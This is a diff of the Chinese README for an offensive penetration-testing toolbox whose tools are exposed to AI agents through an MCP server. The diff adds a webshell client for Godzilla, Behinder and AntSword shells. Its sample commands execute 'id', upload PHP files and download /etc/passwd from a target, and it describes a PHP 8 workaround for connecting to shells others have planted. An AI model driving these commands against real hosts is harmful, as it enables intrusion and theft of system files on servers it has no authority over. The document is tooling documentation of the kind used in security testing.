@@ -1,9 +1,9 @@
 # zeroxf 工具箱 · AI 版
 
-**一个既给人用、也给 AI 用的渗透测试工具箱**——64 个工具，统一的图形界面、命令行与 MCP 接口，三套入口共用同一份工具注册表。
+**一个既给人用、也给 AI 用的渗透测试工具箱**——65 个工具，统一的图形界面、命令行与 MCP 接口，三套入口共用同一份工具注册表。
 
 [![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20WSL%2FLinux-blue)](#安装)
-[![Tools](https://img.shields.io/badge/tools-64%20(%E5%85%B6%E4%B8%AD58%E4%B8%AAAI%E5%8F%AF%E8%B0%83)-brightgreen)](#集成的工具)
+[![Tools](https://img.shields.io/badge/tools-65%20(%E5%85%B6%E4%B8%AD59%E4%B8%AAAI%E5%8F%AF%E8%B0%83)-brightgreen)](#集成的工具)
 [![License](https://img.shields.io/badge/license-GPL--3.0-orange)](LICENSE)
 [![MCP](https://img.shields.io/badge/MCP-ready-purple)](#mcp-ai-调用)
 
@@ -37,7 +37,7 @@
 
 ## 亮点
 
-- **64 个工具开箱可用**，横跨信息收集到后渗透的完整链路；其中 **58 个可被 AI 直接调用**
+- **65 个工具开箱可用**，横跨信息收集到后渗透的完整链路；其中 **59 个可被 AI 直接调用**
 - **三套入口，一份配置** —— GUI 里能点的，CLI 和 MCP 里都能调，不会出现"界面有、命令行没有"的割裂
 - **依赖自动装配** —— `provision_tools.py` 一条命令拉齐全部工具二进制、便携 JDK、GUI 运行时，自动适配 Windows / Linux / macOS
 - **零环境依赖的 JDK 方案** —— 内置便携 JDK 8/11/17（8 与 11 为 Liberica full 版，内含 JavaFX），12 个 jar 类工具无需系统装 Java
@@ -50,7 +50,7 @@
 
 ## 集成的工具
 
-**共 64 个**（58 个 AI 可直接调用），按 9 大类组织：
+**共 65 个**（59 个 AI 可直接调用），按 9 大类组织：
 
 | 分类 | 数量 | 代表工具 |
 | --- | ---: | --- |
@@ -63,7 +63,7 @@
 | 隧道代理 | 3 | `frps` `frpc` `chisel` |
 | 后渗透 | 5 | `metasploit` `sliver` `cobaltstrike` `avoidkilling` `revshell` |
 | 数据库利用 | 6 | `mysql` `mssql` `mongodb` `oracle` `usql` `dbcombo` |
-| WebShell 管理 | 3 | `蚁剑` `godzilla` `behinder` |
+| WebShell 管理 | 4 | **`webshell`**（CLI，AI 可调）`蚁剑` `godzilla` `behinder` |
 | 抓包与代理 | 1 | `BurpSuite` |
 
 **能力覆盖**：被动信息收集 → 主动漏洞扫描 → 框架专项利用 → 内网横向 → 权限维持 → 数据提取，一条完整链路。
@@ -80,6 +80,36 @@
 | `CobaltStrike` `BurpSuite` `蚁剑` | 商业软件 / 需自备 | 保留条目，装入后即可用；`Sliver`（`sliver` 命令）与 `ZAP` 分别是 CS / Burp 的开源等价物 |
 
 `geshell doctor` 会明确列出这些项，不会静默失败。
+
+### WebShell 管理：三种 GUI 工具的协议，收进一个 CLI
+
+蚁剑 / 冰蝎 / 哥斯拉都是图形化程序，AI 驱动不了它们——但这不等于 AI 用不了它们的
+能力。「WebShell 管理」的本质就是**按约定协议发 HTTP 请求**，而这三家协议都是公开
+可实现的。`webshell` 工具实现的正是协议本身：
+
+```bash
+# 自动识别是哪种马（哥斯拉型需要 --key）
+geshell webshell -u http://target/shell.php -p pass -t auto -c "id"
+
+geshell webshell -u ... -p pass -t godzilla --key <16字节密钥> --info
+geshell webshell -u ... -p pass -t behinder  --upload ./x.php:/var/www/x.php
+geshell webshell -u ... -p pass -t antsword --download /etc/passwd:./passwd.txt
+```
+
+这与 Burp 走官方 MCP 是同一个思路：**绕开 GUI，直接接协议**。
+
+| 协议 | 命令执行 | 信息探测 | 上传 / 下载 | 备注 |
+| --- | :---: | :---: | :---: | --- |
+| 哥斯拉 phpXor | ✅ | ✅ | ✅ 原生 | 需要生成 shell 时的 16 字节密钥 |
+| 冰蝎 v4 | ✅ | ✅ | ⚠️ 走命令通道 | 见下方 PHP 8 说明 |
+| 蚁剑 | ✅ | ✅ | ⚠️ 走命令通道 | 命令通道依赖目标机有 `base64` |
+
+> **冰蝎在 PHP 8 上的坑**：它的载荷外壳写作 `assert|eval(...)`，靠的是 PHP 8 之前
+> 「未定义常量当字符串用」的老行为。**PHP 8 起这是致命错误**，症状是响应完全空白、
+> 握手静默失败——没有任何报错，最难查的那种。
+> 补丁可以打在服务端 shell 里，但真实场景连的是**别人已经上传好的马，改不了目标**。
+> `webshell` 因此走客户端降级：标准外壳连不上就换 `define("assert",0);` 前缀重试，
+> **目标一个字节都不用动**。
 
 ### jar 类工具为什么走 Release 而不是 git
 
@@ -207,13 +237,13 @@ Windows 端用 `oracle-py` 替代）。`geshell doctor` 会把缺的逐条列出
 
 ## 安装
 
-### 先搞清楚：64 个工具分别从哪来
+### 先搞清楚：65 个工具分别从哪来
 
 工具箱的获取方式**不是一种而是四种**，因为它们性质不同：
 
 | # | 来源 | 数量 | 装法 |
 | --- | ---: | ---: | --- |
-| a | **随 git 分发** | 11 | clone 即有，无需操作 |
+| a | **随 git 分发** | 12 | clone 即有，无需操作 |
 | b | **provision 自动下载** | 32 | `python3 scripts/provision_tools.py` |
 | c | **Release 资产** | 14 | `python3 scripts/provision_tools.py --jars` |
 | d | **需自备 / 无公开源** | 7 | 见下方说明，`doctor` 会如实报缺失 |
@@ -247,6 +277,7 @@ cd zeroxf_tools
 python3 scripts/provision_tools.py --jdk    # 便携 JDK 8/11/17（14 个 jar 类工具需要）
 python3 scripts/provision_tools.py          # 全部工具二进制 + jar 包
 python3 scripts/provision_tools.py --gui    # GUI 运行时 PyQt6（用图形界面才装）
+python3 scripts/provision_tools.py --webshell-deps  # webshell 工具依赖（全量安装已含）
 
 # 仅 Windows：补装系统级工具（nmap / MySQL 客户端 / Metasploit）
 python scripts/provision_tools.py --win-deps
@@ -307,7 +338,7 @@ python3 scripts/provision_tools.py --help                        # 查看全部�
 
 ### MCP（AI 调用）
 
-`ai/mcp_server.py` 是一个 stdio JSON-RPC MCP server，把 58 个可调用工具暴露为 `tool_<名称>`：
+`ai/mcp_server.py` 是一个 stdio JSON-RPC MCP server，把 59 个可调用工具暴露为 `tool_<名称>`：
 
 在 `~/.claude.json` 的 `mcpServers` 段加入：
 
